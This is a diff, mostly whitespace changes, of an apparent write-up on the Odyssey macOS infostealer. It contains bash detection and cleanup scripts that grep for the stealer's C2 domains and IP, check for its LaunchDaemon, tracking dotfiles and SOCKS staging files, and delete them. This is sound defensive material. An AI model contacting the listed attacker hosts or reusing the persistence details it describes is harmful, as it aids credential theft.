-  if lsof -i -n -P 2>/dev/null | grep -E "charge0x\.at|ukdsopas\.at|192\.253\.248\.181" >/tmp/xdivcmp_net.$$; then
-    hit "Found active outbound network connection matching known IoCs"
-    sed 's/^/    /' /tmp/xdivcmp_net.$$
-  else
-    ok "No active outbound lsof connection to known IoCs found"
-  fi
-  rm -f /tmp/xdivcmp_net.$$
+ if lsof -i -n -P 2>/dev/null | grep -E "charge0x\.at|ukdsopas\.at|192\.253\.248\.181" >/tmp/xdivcmp_net.$$; then
+ hit "Found active outbound network connection matching known IoCs"
+ sed 's/^/ /' /tmp/xdivcmp_net.$$
+ else
+ ok "No active outbound lsof connection to known IoCs found"
+ fi
+ rm -f /tmp/xdivcmp_net.$$
 fi
 
 # 2. Check for suspicious listening ports (The SOCKS5 proxy or Reverse Shell)
@@ -897,30 +897,30 @@ fi
 say "Checking for suspicious local listening ports..."
 LISTENING_PORTS=$(lsof -i -P -n 2>/dev/null | grep LISTEN | grep -v "com.apple" || true)
 if [ -n "$LISTENING_PORTS" ]; then
-  warn "Found non-Apple processes listening on network ports (Review these):"
-  echo "$LISTENING_PORTS" | sed 's/^/    /'
+ warn "Found non-Apple processes listening on network ports (Review these):"
+ echo "$LISTENING_PORTS" | sed 's/^/ /'
 else
-  ok "No suspicious third-party listening ports found."
+ ok "No suspicious third-party listening ports found."
 fi
 
 section "Verdict"
 
 if [ "$FOUND" -eq 1 ]; then
-  say "RESULT: KNOWN IOCS FOUND."
-  say "Treat this Mac as compromised. Change passwords from a different clean device."
+ say "RESULT: KNOWN IOCS FOUND."
+ say "Treat this Mac as compromised. Change passwords from a different clean device."
 elif [ "$SUSPICIOUS" -eq 1 ]; then
-  say "RESULT: No hard IoC found, but warnings occurred."
-  say "This does not prove the Mac is clean."
+ say "RESULT: No hard IoC found, but warnings occurred."
+ say "This does not prove the Mac is clean."
 else
-  say "RESULT: No known malware IoCs found by this script."
-  say "This does not prove the Mac is clean; it only checks known infection patterns."
+ say "RESULT: No known malware IoCs found by this script."
+ say "This does not prove the Mac is clean; it only checks known infection patterns."
 fi
 
 if [ "$CLEAN" -ne 1 ]; then
-  section "No cleanup performed"
-  say "To clean known IoCs, run:"
-  say "  sudo $0 --clean"
-  exit 0
+ section "No cleanup performed"
+ say "To clean known IoCs, run:"
+ say " sudo $0 --clean"
+ exit 0
 fi
 
 section "Cleanup mode: evidence backup"
@@ -929,22 +929,22 @@ EVIDENCE_DIR="/Users/Shared/odyssey-evidence-$(timestamp)"
 mkdir -p "$EVIDENCE_DIR"
 
 backup_item() {
-  item="$1"
-  if [ -e "$item" ]; then
-    say "  Backing up: $item"
-    ditto "$item" "$EVIDENCE_DIR/$(basename "$item")" 2>/dev/null || cp -R "$item" "$EVIDENCE_DIR/" 2>/dev/null || true
-  fi
+ item="$1"
+ if [ -e "$item" ]; then
+ say " Backing up: $item"
+ ditto "$item" "$EVIDENCE_DIR/$(basename "$item")" 2>/dev/null || cp -R "$item" "$EVIDENCE_DIR/" 2>/dev/null || true
+ fi
 }
 
 backup_item "$INSTALL_APP"
 backup_item "$LAUNCHD_PLIST"
 for f in "${DOTFILES[@]}"; do
-  backup_item "$f"
+ backup_item "$f"
 done
 
 if [ -d "$EVIDENCE_DIR" ]; then
-  say "Evidence copied to: $EVIDENCE_DIR"
-  /usr/bin/zip -qry "$EVIDENCE_DIR.zip" "$EVIDENCE_DIR" 2>/dev/null && say "Evidence zip: $EVIDENCE_DIR.zip"
+ say "Evidence copied to: $EVIDENCE_DIR"
+ /usr/bin/zip -qry "$EVIDENCE_DIR.zip" "$EVIDENCE_DIR" 2>/dev/null && say "Evidence zip: $EVIDENCE_DIR.zip"
 fi
 
 section "Cleanup mode: unload persistence and kill processes"
@@ -953,7 +953,7 @@ launchctl bootout system "$LAUNCHD_PLIST" 2>/dev/null || true
 launchctl remove system/com.xdivcmp 2>/dev/null || true
 
 # Kill the active AppleScript and Bash loops spawned by the malware
-say "  Killing active malware processes..."
+say " Killing active malware processes..."
 pkill -f "xxxblyat" 2>/dev/null || true
 pkill -f "com.xdivcmp" 2>/dev/null || true
 pkill -f "/tmp/socks" 2>/dev/null || true
@@ -962,21 +962,21 @@ pkill -f "lksopo" 2>/dev/null || true
 section "Cleanup mode: remove known IoCs"
 
 remove_item() {
-  item="$1"
-  if [ -e "$item" ]; then
-    say "  Removing: $item"
-    rm -rf "$item"
-  fi
+ item="$1"
+ if [ -e "$item" ]; then
+ say " Removing: $item"
+ rm -rf "$item"
+ fi
 }
 
 remove_item "$INSTALL_APP"
 remove_item "$LAUNCHD_PLIST"
 for f in "${DOTFILES[@]}"; do
-  remove_item "$f"
+ remove_item "$f"
 done
 
 # Remove known temp files dropped by the malware
-say "  Removing malware staging files in /tmp/..."
+say " Removing malware staging files in /tmp/..."
 rm -f /tmp/socks 2>/dev/null || true
 rm -rf /tmp/lksopo 2>/dev/null || true
 rm -f /tmp/lksopo.zip 2>/dev/null || true
@@ -984,18 +984,18 @@ rm -f /tmp/lksopo.zip 2>/dev/null || true
 section "Cleanup mode: re-enable Gatekeeper"
 
 spctl --master-enable 2>/dev/null || true
-spctl --status 2>/dev/null | sed 's/^/  /' || true
+spctl --status 2>/dev/null | sed 's/^/ /' || true
 
 section "Cleanup complete"
 
 say "Known IoCs were removed if present."
 say ""
 say "Important next steps:"
-say "  1. Reboot the Mac."
-say "  2. Run this script again in detect-only mode."
-say "  3. Change passwords from a different clean device."
-say "  4. Revoke browser sessions, email sessions, Apple ID sessions, GitHub/API tokens, SSH keys, and crypto wallet seeds."
-say "  5. Strongly consider erase/reinstall macOS instead of trusting cleanup alone."
+say " 1. Reboot the Mac."
+say " 2. Run this script again in detect-only mode."
+say " 3. Change passwords from a different clean device."
+say " 4. Revoke browser sessions, email sessions, Apple ID sessions, GitHub/API tokens, SSH keys, and crypto wallet seeds."
+say " 5. Strongly consider erase/reinstall macOS instead of trusting cleanup alone."
 ```
 
 ### 10.1 IoCs Checked
@@ -1021,7 +1021,7 @@ sudo ./detect_odyssey_mac.sh
 sudo ./detect_odyssey_mac.sh --clean
 ```
 
-**The script insists on erasing and reinstalling macOS** — cleanup alone is not sufficient due to the `doshell` backdoor.
+**The script insists on erasing and reinstalling macOS** - cleanup alone is not sufficient due to the `doshell` backdoor.
 
 ---
 
@@ -1047,20 +1047,20 @@ set -u
 TARGET_VOL="${1:-}"
 
 if [ -z "$TARGET_VOL" ] || [ ! -d "$TARGET_VOL" ]; then
-  printf '\n'
-  printf 'ERROR: You must provide the path to the external drive.\n'
-  printf 'Usage: sudo %s "/Volumes/NameOfExternalDrive"\n' "$0"
-  printf '\n'
-  printf 'To find your drive name, open Finder and look in the left sidebar,\n'
-  printf 'or type: ls /Volumes/\n'
-  printf '\n'
-  exit 1
+ printf '\n'
+ printf 'ERROR: You must provide the path to the external drive.\n'
+ printf 'Usage: sudo %s "/Volumes/NameOfExternalDrive"\n' "$0"
+ printf '\n'
+ printf 'To find your drive name, open Finder and look in the left sidebar,\n'
+ printf 'or type: ls /Volumes/\n'
+ printf '\n'
+ exit 1
 fi
 
 if [ "$(id -u)" -ne 0 ]; then
-  printf 'ERROR: This script requires administrator (root) privileges to read external drives.\n'
-  printf 'Please run: sudo %s "%s"\n' "$0" "$TARGET_VOL"
-  exit 1
+ printf 'ERROR: This script requires administrator (root) privileges to read external drives.\n'
+ printf 'Please run: sudo %s "%s"\n' "$0" "$TARGET_VOL"
+ exit 1
 fi
 
 # ============================================================
@@ -1068,51 +1068,51 @@ fi
 # ============================================================
 printf '\n'
 printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
-printf '!!                                                                !!\n'
-printf '!!  EXTERNAL DRIVE FORENSIC SCANNER                               !!\n'
-printf '!!                                                                !!\n'
-printf '!!  Target Drive: %-48s !!\n' "$TARGET_VOL"
-printf '!!                                                                !!\n'
-printf '!!  This script will scan the dormant files on this drive.        !!\n'
-printf '!!  It will NOT check live network connections or active memory,  !!\n'
-printf '!!  because this drive is not the active operating system.        !!\n'
-printf '!!                                                                !!\n'
+printf '!! !!\n'
+printf '!! EXTERNAL DRIVE FORENSIC SCANNER !!\n'
+printf '!! !!\n'
+printf '!! Target Drive: %-48s !!\n' "$TARGET_VOL"
+printf '!! !!\n'
+printf '!! This script will scan the dormant files on this drive. !!\n'
+printf '!! It will NOT check live network connections or active memory, !!\n'
+printf '!! because this drive is not the active operating system. !!\n'
+printf '!! !!\n'
 printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
 printf '\n'
 sleep 3
 
 CLEAN=0
 if [ "${2:-}" = "--clean" ]; then
-  CLEAN=1
+ CLEAN=1
 fi
 
 FOUND=0
 SUSPICIOUS=0
 
 timestamp() {
-  date +"%Y-%m-%d_%H-%M-%S"
+ date +"%Y-%m-%d_%H-%M-%S"
 }
 
 say() {
-  printf '%s\n' "$*"
+ printf '%s\n' "$*"
 }
 
 hit() {
-  FOUND=1
-  printf '  [HIT] %s\n' "$*"
+ FOUND=1
+ printf ' [HIT] %s\n' "$*"
 }
 
 warn() {
-  SUSPICIOUS=1
-  printf '  [WARN] %s\n' "$*"
+ SUSPICIOUS=1
+ printf ' [WARN] %s\n' "$*"
 }
 
 ok() {
-  printf '  [OK] %s\n' "$*"
+ printf ' [OK] %s\n' "$*"
 }
 
 section() {
-  printf '\n==== %s ====\n' "$*"
+ printf '\n==== %s ====\n' "$*"
 }
 
 # ============================================================
@@ -1125,22 +1125,22 @@ say ""
 
 TARGET_USERS=()
 if [ -d "$TARGET_VOL/Users" ]; then
-  for d in "$TARGET_VOL/Users"/*; do
-    if [ -d "$d" ]; then
-      bname=$(basename "$d")
-      if [ "$bname" != "Shared" ] && [ "$bname" != "Guest" ] && [ "$bname" != ".localized" ]; then
-        TARGET_USERS+=("$d")
-        say "  Found user account on external drive: $bname"
-      fi
-    fi
-  done
+ for d in "$TARGET_VOL/Users"/*; do
+ if [ -d "$d" ]; then
+ bname=$(basename "$d")
+ if [ "$bname" != "Shared" ] && [ "$bname" != "Guest" ] && [ "$bname" != ".localized" ]; then
+ TARGET_USERS+=("$d")
+ say " Found user account on external drive: $bname"
+ fi
+ fi
+ done
 else
-  warn "Could not find a standard '/Users' folder on this drive."
-  say "  This might be a data-only drive, or a Time Machine backup (which hides user folders)."
+ warn "Could not find a standard '/Users' folder on this drive."
+ say " This might be a data-only drive, or a Time Machine backup (which hides user folders)."
 fi
 
 if [ ${#TARGET_USERS[@]} -eq 0 ]; then
-  warn "No standard user folders found. I will still scan system folders."
+ warn "No standard user folders found. I will still scan system folders."
 fi
 
 # ============================================================
@@ -1153,22 +1153,22 @@ say ""
 INSTALL_APP="$TARGET_VOL/Library/Application Support/Install.app"
 LAUNCHD_PLIST="$TARGET_VOL/Library/LaunchDaemons/com.xdivcmp.plist"
 
-say "  Checking for the fake 'Install.app'..."
+say " Checking for the fake 'Install.app'..."
 if [ -e "$INSTALL_APP" ]; then
-  hit "FOUND the fake Install.app on the external drive!"
-  ls -ld "$INSTALL_APP" 2>/dev/null | sed 's/^/    /'
+ hit "FOUND the fake Install.app on the external drive!"
+ ls -ld "$INSTALL_APP" 2>/dev/null | sed 's/^/ /'
 else
-  ok "The fake Install.app was NOT found."
+ ok "The fake Install.app was NOT found."
 fi
 
 say ""
-say "  Checking for the malicious startup file (LaunchDaemon)..."
+say " Checking for the malicious startup file (LaunchDaemon)..."
 if [ -e "$LAUNCHD_PLIST" ]; then
-  hit "FOUND the malicious startup file on the external drive!"
-  say "  If this is a bootable clone, it will infect the Mac on next boot."
-  sed 's/^/    /' "$LAUNCHD_PLIST" 2>/dev/null || true
+ hit "FOUND the malicious startup file on the external drive!"
+ say " If this is a bootable clone, it will infect the Mac on next boot."
+ sed 's/^/ /' "$LAUNCHD_PLIST" 2>/dev/null || true
 else
-  ok "The malicious startup file was NOT found."
+ ok "The malicious startup file was NOT found."
 fi
 
 # ============================================================
@@ -1179,24 +1179,24 @@ say "Looking for the tiny hidden files the malware uses to track the victim..."
 say ""
 
 DOTFILES=(
-  ".pwd"
-  ".phost"
-  ".bhost"
-  ".username"
-  ".botid"
-  ".lastaction"
-  ".uninstalled"
+ ".pwd"
+ ".phost"
+ ".bhost"
+ ".username"
+ ".botid"
+ ".lastaction"
+ ".uninstalled"
 )
 
 for u in "${TARGET_USERS[@]}"; do
-  say "  Scanning user: $(basename "$u")"
-  for f in "${DOTFILES[@]}"; do
-    filepath="$u/$f"
-    if [ -e "$filepath" ]; then
-      hit "FOUND hidden malware file: $filepath"
-      ls -l "$filepath" 2>/dev/null | sed 's/^/    /'
-    fi
-  done
+ say " Scanning user: $(basename "$u")"
+ for f in "${DOTFILES[@]}"; do
+ filepath="$u/$f"
+ if [ -e "$filepath" ]; then
+ hit "FOUND hidden malware file: $filepath"
+ ls -l "$filepath" 2>/dev/null | sed 's/^/ /'
+ fi
+ done
 done
 
 # ============================================================
@@ -1208,38 +1208,38 @@ say "This may take a minute."
 say ""
 
 IOC_STRINGS=(
-  "charge0x.at"
-  "ukdsopas.at"
-  "192.253.248.181"
-  "xdivcmp"
-  "com.xdivcmp"
-  "xxxblyat"
-  "/web/socks"
-  "lksopo"
+ "charge0x.at"
+ "ukdsopas.at"
+ "192.253.248.181"
+ "xdivcmp"
+ "com.xdivcmp"
+ "xxxblyat"
+ "/web/socks"
+ "lksopo"
 )
 
 PERSISTENCE_DIRS=(
-  "$TARGET_VOL/Library/LaunchAgents"
-  "$TARGET_VOL/Library/LaunchDaemons"
+ "$TARGET_VOL/Library/LaunchAgents"
+ "$TARGET_VOL/Library/LaunchDaemons"
 )
 
 # Add user launch agents
 for u in "${TARGET_USERS[@]}"; do
-  PERSISTENCE_DIRS+=("$u/Library/LaunchAgents")
+ PERSISTENCE_DIRS+=("$u/Library/LaunchAgents")
 done
 
 for d in "${PERSISTENCE_DIRS[@]}"; do
-  if [ -d "$d" ]; then
-    for s in "${IOC_STRINGS[@]}"; do
-      matches="$(grep -RIl "$s" "$d" 2>/dev/null || true)"
-      if [ -n "$matches" ]; then
-        hit "Found the malware keyword '$s' hidden inside a startup file on the external drive!"
-        printf '%s\n' "$matches" | sed 's/^/    /'
-      fi
-    done
-  fi
+ if [ -d "$d" ]; then
+ for s in "${IOC_STRINGS[@]}"; do
+ matches="$(grep -RIl "$s" "$d" 2>/dev/null || true)"
+ if [ -n "$matches" ]; then
+ hit "Found the malware keyword '$s' hidden inside a startup file on the external drive!"
+ printf '%s\n' "$matches" | sed 's/^/ /'
+ fi
+ done
+ fi
 done
-say "  Startup folder scan complete."
+say " Startup folder scan complete."
 
 # ============================================================
 # VERDICT & CLEANUP
@@ -1248,71 +1248,71 @@ section "Step 5 of 5: Final Verdict"
 
 printf '\n'
 if [ "$FOUND" -eq 1 ]; then
-  printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
-  printf '!!                                                                !!\n'
-  printf '!!  *** EXTERNAL DRIVE IS INFECTED ***                            !!\n'
-  printf '!!                                                                !!\n'
-  printf '!!  Known malware files or backdoors were found on this drive.    !!\n'
-  printf '!!                                                                !!\n'
-  printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
+ printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
+ printf '!! !!\n'
+ printf '!! *** EXTERNAL DRIVE IS INFECTED *** !!\n'
+ printf '!! !!\n'
+ printf '!! Known malware files or backdoors were found on this drive. !!\n'
+ printf '!! !!\n'
+ printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
 elif [ "$SUSPICIOUS" -eq 1 ]; then
-  printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
-  printf '!!  *** SUSPICIOUS ACTIVITY DETECTED ***                          !!\n'
-  printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
+ printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
+ printf '!! *** SUSPICIOUS ACTIVITY DETECTED *** !!\n'
+ printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
 else
-  say "RESULT: No known malware indicators were found on this external drive."
-  say "Note: This does not guarantee the drive is 100% clean, only that"
-  say "the specific Odyssey/xdivcmp malware fingerprints were not found."
+ say "RESULT: No known malware indicators were found on this external drive."
+ say "Note: This does not guarantee the drive is 100% clean, only that"
+ say "the specific Odyssey/xdivcmp malware fingerprints were not found."
 fi
 
 if [ "$CLEAN" -eq 1 ] && [ "$FOUND" -eq 1 ]; then
-  section "Cleanup: Removing known malware files from external drive"
-  say "Deleting known malware files from $TARGET_VOL..."
-  
-  [ -e "$INSTALL_APP" ] && rm -rf "$INSTALL_APP" && say "  Deleted: $INSTALL_APP"
-  [ -e "$LAUNCHD_PLIST" ] && rm -f "$LAUNCHD_PLIST" && say "  Deleted: $LAUNCHD_PLIST"
-  
-  for u in "${TARGET_USERS[@]}"; do
-    for f in "${DOTFILES[@]}"; do
-      filepath="$u/$f"
-      [ -e "$filepath" ] && rm -f "$filepath" && say "  Deleted: $filepath"
-    done
-  done
-  say "Cleanup complete."
+ section "Cleanup: Removing known malware files from external drive"
+ say "Deleting known malware files from $TARGET_VOL..."
+ 
+ [ -e "$INSTALL_APP" ] && rm -rf "$INSTALL_APP" && say " Deleted: $INSTALL_APP"
+ [ -e "$LAUNCHD_PLIST" ] && rm -f "$LAUNCHD_PLIST" && say " Deleted: $LAUNCHD_PLIST"
+ 
+ for u in "${TARGET_USERS[@]}"; do
+ for f in "${DOTFILES[@]}"; do
+ filepath="$u/$f"
+ [ -e "$filepath" ] && rm -f "$filepath" && say " Deleted: $filepath"
+ done
+ done
+ say "Cleanup complete."
 fi
 
 # ============================================================
 # CRITICAL FINAL INSTRUCTIONS
 # ============================================================
-section "CRITICAL NEXT STEPS — READ CAREFULLY"
+section "CRITICAL NEXT STEPS - READ CAREFULLY"
 
 printf '\n'
 printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
-printf '!!                                                                !!\n'
-printf '!!  DO NOT USE THIS EXTERNAL DRIVE TO RESTORE YOUR MAC.           !!\n'
-printf '!!                                                                !!\n'
-printf '!!  If this is a Time Machine or Bootable Clone backup, the       !!\n'
-printf '!!  malware is likely baked into older backup snapshots that      !!\n'
-printf '!!  this script cannot reach. Restoring from this drive will      !!\n'
-printf '!!  simply re-infect your clean Mac.                              !!\n'
-printf '!!                                                                !!\n'
-printf '!!  YOU MUST ERASE THIS EXTERNAL DRIVE.                           !!\n'
-printf '!!                                                                !!\n'
-printf '!!  1. Open 'Disk Utility' on your clean Mac.                     !!\n'
-printf '!!  2. Select the external drive on the left sidebar.             !!\n'
-printf '!!  3. Click 'Erase' at the top (Format: APFS or Mac OS Extended).!!\n'
-printf '!!  4. Once erased, the drive is safe to use again.               !!\n'
-printf '!!                                                                !!\n'
-printf '!!  If this is just a standard USB drive used for moving files:   !!\n'
-printf '!!  - Move ONLY essential documents (PDFs, Images, Text) to a     !!\n'
-printf '!!    clean computer.                                             !!\n'
-printf '!!  - Do NOT move applications, scripts, or hidden folders.       !!\n'
-printf '!!  - Erase the external drive immediately after.                 !!\n'
-printf '!!                                                                !!\n'
-printf '!!  REMEMBER: Run a FULL scan with Malwarebytes on your clean     !!\n'
-printf '!!  Mac, and keep your Mac disconnected from the internet until   !!\n'
-printf '!!  you have changed all your passwords from a different device.  !!\n'
-printf '!!                                                                !!\n'
+printf '!! !!\n'
+printf '!! DO NOT USE THIS EXTERNAL DRIVE TO RESTORE YOUR MAC. !!\n'
+printf '!! !!\n'
+printf '!! If this is a Time Machine or Bootable Clone backup, the !!\n'
+printf '!! malware is likely baked into older backup snapshots that !!\n'
+printf '!! this script cannot reach. Restoring from this drive will !!\n'
+printf '!! simply re-infect your clean Mac. !!\n'
+printf '!! !!\n'
+printf '!! YOU MUST ERASE THIS EXTERNAL DRIVE. !!\n'
+printf '!! !!\n'
+printf '!! 1. Open 'Disk Utility' on your clean Mac. !!\n'
+printf '!! 2. Select the external drive on the left sidebar. !!\n'
+printf '!! 3. Click 'Erase' at the top (Format: APFS or Mac OS Extended).!!\n'
+printf '!! 4. Once erased, the drive is safe to use again. !!\n'
+printf '!! !!\n'
+printf '!! If this is just a standard USB drive used for moving files: !!\n'
+printf '!! - Move ONLY essential documents (PDFs, Images, Text) to a !!\n'
+printf '!! clean computer. !!\n'
+printf '!! - Do NOT move applications, scripts, or hidden folders. !!\n'
+printf '!! - Erase the external drive immediately after. !!\n'
+printf '!! !!\n'
+printf '!! REMEMBER: Run a FULL scan with Malwarebytes on your clean !!\n'
+printf '!! Mac, and keep your Mac disconnected from the internet until !!\n'
+printf '!! you have changed all your passwords from a different device. !!\n'
+printf '!! !!\n'
 printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
 printf '\n'
 ```
@@ -1403,7 +1403,7 @@ If you find IoCs on your Mac:
 3. **Using a clean device**, change ALL passwords (email, banking, crypto exchanges, social media).
 4. **Move ALL cryptocurrency funds** to new wallets generated on a clean device.
 5. **Run Malwarebytes for Mac** (full system scan) on the compromised machine.
-6. **ERASE THE ENTIRE DISK** via macOS Recovery and **reinstall macOS from scratch**. This is NOT optional — the `doshell` backdoor means the attacker had full command execution.
+6. **ERASE THE ENTIRE DISK** via macOS Recovery and **reinstall macOS from scratch**. This is NOT optional - the `doshell` backdoor means the attacker had full command execution.
 7. **After fresh install**, run Malwarebytes again and run the detection script as a verification.
 8. **DO NOT reuse any passwords** that were stored on this machine.
 
@@ -1433,7 +1433,7 @@ The sample and all associated IOCs have been submitted to VirusTotal, URLhaus, a
 
 ## References
 
-- [0xlibris — Odyssey Infostealer](https://0xlibris.net/posts/odyssey_infostealer/)
-- [Censys — Odyssey Stealer: Inside a macOS Crypto-Stealing Operation](https://censys.com/blog/odyssey-stealer-inside-a-macos-crypto-stealing-operation/)
-- [Jamf Threat Labs — Signed and stealing: uncovering new insights on Odyssey Infostealer](https://www.jamf.com/blog/signed-and-stealing-uncovering-new-insights-on-odyssey-infostealer/)
-- [Red Canary — A taxonomy of Mac stealers: Distinguishing Atomic, Odyssey, and Poseidon](https://redcanary.com/blog/threat-intelligence/atomic-odyssey-poseidon-stealers/)
+- [0xlibris - Odyssey Infostealer](https://0xlibris.net/posts/odyssey_infostealer/)
+- [Censys - Odyssey Stealer: Inside a macOS Crypto-Stealing Operation](https://censys.com/blog/odyssey-stealer-inside-a-macos-crypto-stealing-operation/)
+- [Jamf Threat Labs - Signed and stealing: uncovering new insights on Odyssey Infostealer](https://www.jamf.com/blog/signed-and-stealing-uncovering-new-insights-on-odyssey-infostealer/)
+- [Red Canary - A taxonomy of Mac stealers: Distinguishing Atomic, Odyssey, and Poseidon](https://redcanary.com/blog/threat-intelligence/atomic-odyssey-poseidon-stealers/)
